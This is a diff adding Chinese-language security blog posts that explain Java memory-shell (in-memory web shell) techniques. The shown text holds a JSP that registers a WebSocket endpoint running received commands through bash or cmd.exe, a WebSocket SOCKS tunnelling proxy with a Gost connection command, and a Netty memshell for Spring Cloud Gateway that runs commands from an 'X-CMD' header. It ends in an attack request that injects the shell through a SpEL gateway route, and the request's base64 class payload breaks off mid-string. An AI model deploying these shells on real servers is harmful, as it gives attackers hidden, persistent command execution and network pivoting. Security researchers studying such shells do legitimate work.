+                    process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, s });
+                }
+                InputStream inputStream = process.getInputStream();
+                StringBuilder stringBuilder = new StringBuilder();
+                int i;
+                while ((i = inputStream.read()) != -1)
+                    stringBuilder.append((char)i);
+                inputStream.close();
+                process.waitFor();
+                session.getBasicRemote().sendText(stringBuilder.toString());
+            } catch (Exception exception) {
+                exception.printStackTrace();
+            }
+        }
+        @Override
+        public void onOpen(final Session session, EndpointConfig config) {
+            this.session = session;
+            session.addMessageHandler(this);
+        }
+    }
+</code></pre>
+<p>结果</p>
+<pre><code class="language-jsp">&lt;%@ page import=&quot;javax.websocket.server.ServerEndpointConfig&quot; %&gt;
+&lt;%@ page import=&quot;javax.websocket.server.ServerContainer&quot; %&gt;
+&lt;%@ page import=&quot;javax.websocket.*&quot; %&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+
+&lt;%!
+    public static class C extends Endpoint implements MessageHandler.Whole&lt;String&gt; {
+        private Session session;
+        @Override
+        public void onMessage(String s) {
+            try {
+                Process process;
+                boolean bool = System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;);
+                if (bool) {
+                    process = Runtime.getRuntime().exec(new String[] { &quot;cmd.exe&quot;, &quot;/c&quot;, s });
+                } else {
+                    process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, s });
+                }
+                InputStream inputStream = process.getInputStream();
+                StringBuilder stringBuilder = new StringBuilder();
+                int i;
+                while ((i = inputStream.read()) != -1)
+                    stringBuilder.append((char)i);
+                inputStream.close();
+                process.waitFor();
+                session.getBasicRemote().sendText(stringBuilder.toString());
+            } catch (Exception exception) {
+                exception.printStackTrace();
+            }
+        }
+        @Override
+        public void onOpen(final Session session, EndpointConfig config) {
+            this.session = session;
+            session.addMessageHandler(this);
+        }
+    }
+%&gt;
+&lt;%
+    String path = request.getParameter(&quot;path&quot;);
+    ServletContext servletContext = request.getSession().getServletContext();
+    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(C.class, path).build();
+    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+    try {
+        if (servletContext.getAttribute(path) == null){
+            container.addEndpoint(configEndpoint);
+            servletContext.setAttribute(path,path);
+        }
+        out.println(&quot;success, connect url path: &quot; + servletContext.getContextPath() + path);
+    } catch (Exception e) {
+        out.println(e.toString());
+    }
+%&gt;
+</code></pre>
+<p>注入：http://localhost:8080/1.jsp?path=/6right</p>
+<p>ws命令执行：http://www.yunjson.com/websocket/</p>
+<h3 id="代理实现">代理实现</h3>
+<p>还是用veo师傅的代码分析</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;javax.websocket.server.ServerEndpointConfig&quot; %&gt;
+&lt;%@ page import=&quot;javax.websocket.server.ServerContainer&quot; %&gt;
+&lt;%@ page import=&quot;javax.websocket.*&quot; %&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.channels.AsynchronousSocketChannel&quot; %&gt;
+&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.channels.CompletionHandler&quot; %&gt;
+&lt;%@ page import=&quot;java.net.InetSocketAddress&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.Future&quot; %&gt;
+&lt;%!
+    public static class ProxyEndpoint extends Endpoint {
+        long i =0;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        HashMap&lt;String,AsynchronousSocketChannel&gt; map = new HashMap&lt;String,AsynchronousSocketChannel&gt;();
+        static class Attach {
+            public AsynchronousSocketChannel client;
+            public Session channel;
+        }
+        void readFromServer(Session channel,AsynchronousSocketChannel client){
+            final ByteBuffer buffer = ByteBuffer.allocate(50000);
+            Attach attach = new Attach();
+            attach.client = client;
+            attach.channel = channel;
+            client.read(buffer, attach, new CompletionHandler&lt;Integer, Attach&gt;() {
+                @Override
+                public void completed(Integer result, final Attach scAttachment) {
+                    buffer.clear();
+                    try {
+                        if(buffer.hasRemaining() &amp;&amp; result&gt;=0)
+                        {
+                            byte[] arr = new byte[result];
+                            ByteBuffer b = buffer.get(arr,0,result);
+                            baos.write(arr,0,result);
+                            ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
+                            if (scAttachment.channel.isOpen()) {
+                                scAttachment.channel.getBasicRemote().sendBinary(q);
+                            }
+                            baos = new ByteArrayOutputStream();
+                            readFromServer(scAttachment.channel,scAttachment.client);
+                        }else{
+                            if(result &gt; 0)
+                            {
+                                byte[] arr = new byte[result];
+                                ByteBuffer b = buffer.get(arr,0,result);
+                                baos.write(arr,0,result);
+                                readFromServer(scAttachment.channel,scAttachment.client);
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                @Override
+                public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();}
+            });
+        }
+        void process(ByteBuffer z,Session channel)
+        {
+            try{
+                if(i&gt;1)
+                {
+                    AsynchronousSocketChannel client = map.get(channel.getId());
+                    client.write(z).get();
+                    z.flip();
+                    z.clear();
+                }
+                else if(i==1)
+                {
+                    String values = new String(z.array());
+                    String[] array = values.split(&quot; &quot;);
+                    String[] addrarray = array[1].split(&quot;:&quot;);
+                    AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
+                    int po = Integer.parseInt(addrarray[1]);
+                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
+                    Future&lt;Void&gt; future = client.connect(hostAddress);
+                    try {
+                        future.get(10, TimeUnit.SECONDS);
+                    } catch(Exception ignored){
+                        channel.getBasicRemote().sendText(&quot;HTTP/1.1 503 Service Unavailable\r\n\r\n&quot;);
+                        return;
+                    }
+                    map.put(channel.getId(), client);
+                    readFromServer(channel,client);
+                    channel.getBasicRemote().sendText(&quot;HTTP/1.1 200 Connection Established\r\n\r\n&quot;);
+                }
+            }catch(Exception ignored){
+            }
+        }
+        @Override
+        public void onOpen(final Session session, EndpointConfig config) {
+            i=0;
+            session.setMaxBinaryMessageBufferSize(1024*1024*20);
+            session.setMaxTextMessageBufferSize(1024*1024*20);
+            session.addMessageHandler(new MessageHandler.Whole&lt;ByteBuffer&gt;() {
+                @Override
+                public void onMessage(ByteBuffer message) {
+                    try {
+                        message.clear();
+                        i++;
+                        process(message,session);
+                    } catch (Exception ignored) {
+                    }
+                }
+            });
+        }
+    }
+%&gt;
+&lt;%
+    String path = request.getParameter(&quot;path&quot;);
+    ServletContext servletContext = request.getSession().getServletContext();
+    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(ProxyEndpoint.class, path).build();
+    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+    try {
+        if (servletContext.getAttribute(path) == null){
+            container.addEndpoint(configEndpoint);
+            servletContext.setAttribute(path,path);
+        }
+        out.println(&quot;success, connect url path: &quot; + servletContext.getContextPath() + path);
+    } catch (Exception e) {
+        out.println(e.toString());
+    }
+%&gt;
+</code></pre>
+<p>首先还是正常的添加Endpoint，直接看重写的onOpen</p>
+<pre><code class="language-java">public void onOpen(final Session session, EndpointConfig config) {
+            i=0;
+            session.setMaxBinaryMessageBufferSize(1024*1024*20);
+            session.setMaxTextMessageBufferSize(1024*1024*20);
+            session.addMessageHandler(new MessageHandler.Whole&lt;ByteBuffer&gt;() {
+                @Override
+                public void onMessage(ByteBuffer message) {
+                    try {
+                        message.clear();
+                        i++;
+                        process(message,session);
+                    } catch (Exception ignored) {
+                    }
+                }
+            });
+        }
+</code></pre>
+<p>设置了会话的传输大小限制，然后new了一个MessageHandler.Whole<ByteBuffer>()接口(ProxyEndpoint 没有实现)</p>
+<p>重写onMessage方法，接收ByteBuffer(负责承载通信过程中需要读写的消息)，先清空buffer然后调用process函数</p>
+<h4 id="socket通道连接服务端">Socket通道连接服务端</h4>
+<pre><code class="language-java">void process(ByteBuffer z,Session channel)
+        {
+            try{
+                if(i&gt;1)
+                {
+                    AsynchronousSocketChannel client = map.get(channel.getId());
+                    client.write(z).get();
+                    z.flip();
+                    z.clear();
+                }
+                else if(i==1)
+                {
+                    String values = new String(z.array());
+                    String[] array = values.split(&quot; &quot;);
+                    String[] addrarray = array[1].split(&quot;:&quot;);
+                    AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
+                    int po = Integer.parseInt(addrarray[1]);
+                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
+                    Future&lt;Void&gt; future = client.connect(hostAddress);
+                    try {
+                        future.get(10, TimeUnit.SECONDS);
+                    } catch(Exception ignored){
+                        channel.getBasicRemote().sendText(&quot;HTTP/1.1 503 Service Unavailable\r\n\r\n&quot;);
+                        return;
+                    }
+                    map.put(channel.getId(), client);
+                    readFromServer(channel,client);
+                    channel.getBasicRemote().sendText(&quot;HTTP/1.1 200 Connection Established\r\n\r\n&quot;);
+                }
+            }catch(Exception ignored){
+            }
+        }
+</code></pre>
+<p>如果i是1则建立Socket连接，如果&gt;1说明连接已经建立过，直接获取通道，然后调用wirte函数向通道写入字节(然后等readFromServer异步读取即可)</p>
+<p>先通过前面获取的buffer得到client hostAddress，然后通过AsynchronousSocketChannel.open()创建和打开一个实例然后再调用其connect()方法连接到服务端， Future 对象是将当前线程阻塞来等待结果</p>
+<p>将session的id和对应的client管道放到map(不会重复创建)，然后调用readFromServer函数</p>
+<h4 id="服务端交互">服务端交互</h4>
+<pre><code class="language-java">void readFromServer(Session channel,AsynchronousSocketChannel client){
+            final ByteBuffer buffer = ByteBuffer.allocate(50000);
+            Attach attach = new Attach();
+            attach.client = client;
+            attach.channel = channel;
+            client.read(buffer, attach, new CompletionHandler&lt;Integer, Attach&gt;() {
+                @Override
+                public void completed(Integer result, final Attach scAttachment) {
+                    buffer.clear();
+                    try {
+                        if(buffer.hasRemaining() &amp;&amp; result&gt;=0)
+                        {
+                            byte[] arr = new byte[result];
+                            ByteBuffer b = buffer.get(arr,0,result);
+                            baos.write(arr,0,result);
+                            ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
+                            if (scAttachment.channel.isOpen()) {
+                                scAttachment.channel.getBasicRemote().sendBinary(q);
+                            }
+                            baos = new ByteArrayOutputStream();
+                            readFromServer(scAttachment.channel,scAttachment.client);
+                        }else{
+                            if(result &gt; 0)
+                            {
+                                byte[] arr = new byte[result];
+                                ByteBuffer b = buffer.get(arr,0,result);
+                                baos.write(arr,0,result);
+                                readFromServer(scAttachment.channel,scAttachment.client);
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                @Override
+                public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();}
+            });
+        }
+</code></pre>
+<p>allocate分配缓冲区，构建一个指定接收长度的ByteBuffer用于接收数据，然后调用socketChannel.read()方法读取消息并通过CompletionHandler处理读取结果</p>
+<p>CompletionHandler是消息处理回调接口，一个负责消费异步IO操作结果的消息处理器</p>
+<p>此包中定义的异步通道允许指定完成处理程序以使用异步操作的结果。</p>
+<ul>
+<li>completed：当 I/O 操作成功完成时调用该方法(result:实际读取的字节数。如果通道中没有数据可读则result=-1)</li>
+<li>failed：如果 I/O 操作失败，则调用该方法。这些方法的实现应该及时完成，以避免阻止调用线程分派到其他完成处理程序</li>
+</ul>
+<p>这里clear之后在调用remaining()获取未读数据</p>
+<p><strong>clear()</strong> ： 清空缓冲区，官方说明是“clears the buffer”，但详细解释是将 position 和 limit <strong>恢复“出厂设置”</strong>，并<strong>丢弃 mark</strong>。注意，缓冲区中的数据并非清空，只是将两个指针重置，数据处在一种**“被遗忘”状态**，如果进行 get()操作依然可以取出。同时，clear 执行之后的缓冲区无法通过 rewind() 回退指针。所以这时候调用remaining依旧能够获取缓冲区未读的数据</p>
+<ul>
+<li>当缓冲区存在数据且读取到字节&gt;=0时：数据数据通过sendBinary函数发送给远程socket端点(也就是Socket-channel服务端)</li>
+<li>当缓冲区没有数据，但是依旧读取字节时将数据线存入baos，然后回调readFromServer读取(异步)</li>
+</ul>
+<h4 id="使用">使用</h4>
+<p>注入完内存马以后，使用 Gost：https://github.com/go-gost/gost 连接代理</p>
+<ul>
+<li>gost-windows-amd64.exe  -L &quot;socks5://:1080&quot; -F &quot;ws://127.0.0.1:8080?path=/proxy&quot;</li>
+</ul>
+<p>然后代理连接本地1080端口socks5即可</p>
+<h3 id="总结">总结</h3>
+<p>WebSoket内存马通过分析涉及处理websoket的Endpoint对象，获取请求内容，同时控制响应内容。然后只要模拟对象注册到内存当中过程即可。代理的实现稍微复杂一点，注册的Endpoint对象需要实现与服务端(Endpoint远端)之间的连接与通信</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://www.cnblogs.com/duanxz/p/5041110.html</li>
+<li>https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</li>
+<li>https://veo.pub/2022/memshell/</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Netty内存马]]></title>
+        <id>https://liangyueliangyue.github.io/post/netty-nei-cun-ma/</id>
+        <link href="https://liangyueliangyue.github.io/post/netty-nei-cun-ma/">
+        </link>
+        <updated>2022-10-15T10:04:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="netty">Netty</h2>
+<p>netty的web服务没有遵循servlet规范来设计。这也导致了构造它的内存马，与常规中间件有所不同，从某种程度来讲是这是一种新类型的内存马。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>这里用spring cloud gateway的web服务，详情可以看之前的文章</p>
+<ul>
+<li>是netty+spring构建的</li>
+</ul>
+<h3 id="原理学习">原理学习</h3>
+<p>netty处理http请求是构建一条责任链pipline,http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler。</p>
+<p>不像常规的中间件，<code>filter/servlet/listener</code>组件有一个统一的维护对象。</p>
+<p>netty每一个请求过来，都是动态构造pipeline，pipeline上的handler都是在这个时候new的。<strong>负责给pipeline添加handler是<code>ChannelPipelineConfigurer</code>(下面简称为configurer)，因此注入netty内存马的关键是分析<code>configurer</code>如何被netty管理和工作的。</strong></p>
+<p>ChannelPipelineConfigurer的实现类</p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210151806760.png" alt="image-20220928163154908" loading="lazy"></figure>
+<p><code>CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer</code>是为pipeline选择configurer的关键逻辑。</p>
+<pre><code class="language-java">static ChannelPipelineConfigurer compositeChannelPipelineConfigurer(ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other) {
+    if (configurer == ChannelPipelineConfigurer.emptyConfigurer()) { // 默认configurer是无操作空配置
+        return other;
+    } else if (other == ChannelPipelineConfigurer.emptyConfigurer()) { // 其他额外configurer是无操作空配置
+        return configurer;
+    } else {
+        ......
+        ChannelPipelineConfigurer[] newConfigurers = new ChannelPipelineConfigurer[length];
+        int pos;
+        if (thizConfigurers != null) {
+            pos = thizConfigurers.length;
+            System.arraycopy(thizConfigurers, 0, newConfigurers, 0, pos);
+        } else {
+            pos = 1;
+            newConfigurers[0] = configurer;  // 将默认configurer存储到新configurer
+        }
+
+        if (otherConfigurers != null) {
+            System.arraycopy(otherConfigurers, 0, newConfigurers, pos, otherConfigurers.length);
+        } else {
+            newConfigurers[pos] = other; // 将其他额外configurer存储到新configurer
+        }
+        // 合并成新的configurer
+        return new ReactorNetty.CompositeChannelPipelineConfigurer(newConfigurers);
+    }
+}
+</code></pre>
+<p>第一个参数是Spring cloud gateway默认的configurer，第二个是用户额外配置的。一般情况下第一个参数是不为空配置，第二个参数为空配置，所以返回的configurer是Spring cloud gateway默认的。</p>
+<p>如果我们能够设置第二个other参数不为空配置呢？ 那么这两个configurer将被合并为一个新<code>CompositeChannelPipelineConfigurer</code>。</p>
+<p><code>CompositeChannelPipelineConfigurer</code>会循环调用所有合并进来<code>configurer</code>来对<code>pipeline</code>添加<code>handler</code>。</p>
+<pre><code class="language-java">//初始化时调用
+public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress) {
+            ChannelPipelineConfigurer[] var4 = this.configurers;
+            int var5 = var4.length;
+
+            for(int var6 = 0; var6 &lt; var5; ++var6) {
+                ChannelPipelineConfigurer configurer = var4[var6];
+                configurer.onChannelInit(connectionObserver, channel, remoteAddress);
+            }
+
+        }
+</code></pre>
+<p>因此我们可以通过修改other参数为自己的configurer向pipline中添加内存马。翻阅源码发现<code>reactor.netty.transport.TransportConfig</code>类的<code>doOnChannelInit</code>属性存储着other参数，我使用<a href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>以<code>doOnChannelInit</code>为关键字，定位出了它在线程对象的位置。</p>
+<pre><code class="language-java">List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+keys.add(new Keyword.Builder().setField_type(&quot;doOnChannelInit&quot;).build());
+SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+searcher.setIs_debug(true);
+searcher.setMax_search_depth(20);
+searcher.setReport_save_path(&quot;D:\\&quot;);
+searcher.searchObject();
+</code></pre>
+<p>结果</p>
+<pre><code class="language-java">threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
+     ---&gt; val$disposableServer = {reactor.netty.transport.ServerTransport$InetDisposableBind} 
+      ---&gt; config = {reactor.netty.http.server.HttpServerConfig} 
+         ---&gt; doOnChannelInit = {reactor.netty.ReactorNetty$$Lambda$390/910260820}
+</code></pre>
+<h3 id="构造内存马">构造内存马</h3>
+<pre><code class="language-java">import io.netty.buffer.Unpooled;
+import io.netty.channel.*;
+import io.netty.handler.codec.http.*;
+import io.netty.util.CharsetUtil;
+import reactor.netty.ChannelPipelineConfigurer;
+import reactor.netty.ConnectionObserver;
+
+import java.lang.reflect.Array;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.net.SocketAddress;
+import java.util.Scanner;
+
+public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {
+    public static String doInject(){
+        String msg = &quot;inject-start&quot;;
+        try {
+            Method getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;);
+            getThreads.setAccessible(true);
+            Object threads = getThreads.invoke(null);
+		   //获取线程对象
+            for (int i = 0; i &lt; Array.getLength(threads); i++) {
+                Object thread = Array.get(threads, i);
+                if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) {
+                    Field _val$disposableServer = thread.getClass().getDeclaredField(&quot;val$disposableServer&quot;);
+                    _val$disposableServer.setAccessible(true);
+                    Object val$disposableServer = _val$disposableServer.get(thread);
+                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(&quot;config&quot;);
+                    _config.setAccessible(true);
+                    Object config = _config.get(val$disposableServer);
+                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;doOnChannelInit&quot;);
+                    //一级一级获取到doOnChannelInit对象
+                    _doOnChannelInit.setAccessible(true);
+                    //设置other和默认合并为新CompositeChannelPipelineConfigurer
+                    _doOnChannelInit.set(config, new NettyMemshell());
+                    msg = &quot;inject-success&quot;;
+                }
+            }
+        }catch (Exception e){
+            msg = &quot;inject-error&quot;;
+        }
+        return msg;
+    }
+
+    @Override
+    // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler
+    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
+        ChannelPipeline pipeline = channel.pipeline();
+        // 将内存马的handler添加到spring层handler的前面        
+        pipeline.addBefore(&quot;reactor.left.httpTrafficHandler&quot;,&quot;memshell_handler&quot;,new NettyMemshell());
+    }
+
+
+    @Override
+    // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑
+    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
+        if(msg instanceof HttpRequest){
+            HttpRequest httpRequest = (HttpRequest)msg;
+            try {
+                if(httpRequest.headers().contains(&quot;X-CMD&quot;)) {
+                    String cmd = httpRequest.headers().get(&quot;X-CMD&quot;);
+                    String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
+                    // 返回执行结果
+                    send(ctx, execResult, HttpResponseStatus.OK);
+                    return;
+                }
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+        ctx.fireChannelRead(msg);
+    }
+
+
+    private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {
+        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));
+        response.headers().set(HttpHeaderNames.CONTENT_TYPE, &quot;text/plain; charset=UTF-8&quot;);
+        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    }
+}
+</code></pre>
+<p>netty ChannelHandler放置顺序</p>
+<pre><code>代理？[ProxyHandler]-&gt;ssl？[SslHandler]-&gt;ssl跟踪日志（&amp;T）？[SslLoggingHandler]-&gt;ssl？[SslReader]-&gt;日志？[LoggingHandler]-&gt;http？[HttpCodecHandler]-&gt;http-ws？[HttpAggregator]-&gt;http服务器？[HttpTrafficHandler]-&gt;onWriteIdle？[OnChannelWriteIdle]-&gt;onReadIdle？[OnChannelReadIdle]-&gt;http form/multipart？[ChunkedWriter]=&gt;[ReactiveBridge]
+</code></pre>
+<p>scanner.useDelimiter命令在于设置当前scanner的分隔符,默认是空格,\A为正则表达式,表示从字符头开始，整体意思就是读取所有输入,包括回车换行符</p>
+<p>注意：这里需要包含依赖，但是不需要pakeage</p>
+<ul>
+<li>
+<p>java-&gt;class-&gt;base64</p>
+<ul>
+<li>
+<p>linux</p>
+<ul>
+<li>cat Test.class | base64 -w 0 | xargs</li>
+</ul>
+</li>
+<li>
+<p>windows，powershell</p>
+<ul>
+<li><span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \Test at position 38: …ReadAllBytes(&quot;.\̲T̲e̲s̲t̲.class&quot;) ; [Sys…'>a = [System.IO.File]::ReadAllBytes(&quot;.\Test.class&quot;) ; [System.Convert]::ToBase64String(</span>a)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>攻击请求</p>
+<pre><code class="language-http">POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 192.168.159.132:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 8157
+
+{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBFAoAPgB9CAB+BwB/CABTBwCACgAFAIEKAIIAgwcAhAoAggCFCgCGAIcKAIYAiAoACACJCgAFAIoIAIsKAIwAjQgASwoABQCOCgCPAIMKAI8AkAoABQCRCABOCACSBwCTCgAXAH0KAI8AlAgAlQcAlggAlwsAmACZCACaCACbCwCcAJ0HAJ4LACEAnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKACYAqggAqwoAJgCsCgAmAK0JAK4ArwoAFwCwCgAbALELALIAswcAtAkAtQC2CQC3ALgKALkAugoAMgC7CwC8AJ8JAL0AvggAvwoAoQDACwCyAMEJAMIAwwsAxADFBwDGBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAyAcAyQcAhAcAlgEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsHAJ4BAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAygDLBwDJDADMAM0BABBqYXZhL2xhbmcvT2JqZWN0DADOAM8HANAMANEA0gwA0wDUDADVANYMANcASAEADk5ldHR5V2ViU2VydmVyBwDIDADYANkMANoA2wcA3AwA0wDdDADeANYBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADfAOABAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHAOEMAGcA4gEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDjDADkAOUBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOYA5wEABVgtQ01EBwDoDADYAOkMANMA6gEAEWphdmEvdXRpbC9TY2FubmVyBwDrDADsAO0MAO4A7wcA8AwA8QDyDABAAPMBAAJcQQwA9AD1DAD2AEgHAPcMAPgAeAwAdAB1DAD5AEEHAPoMAPsA/AEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA/QwA/gD/BwEADAEBAQIHAQMMAQQBBQwAQAEGBwEHBwEIDAEJAQoBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADfAQsMAQwBDQcBDgwBDwEQBwERDAESARMBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBA